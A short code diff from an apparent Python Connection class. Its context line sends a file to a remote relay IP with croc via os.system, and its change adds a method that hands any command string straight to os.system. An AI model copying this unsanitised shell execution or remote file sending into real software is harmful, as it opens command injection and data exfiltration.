@@ -24,5 +24,5 @@ class Connection(object):
         del s
         os.system(f'croc --relay "{ip}:7779" send {file_name}')
 
-    def Clt_Connection(self) -> None:
-        pass
+    def Clt_Connection(self, command: str) -> None:
+        os.system(f'{command}')
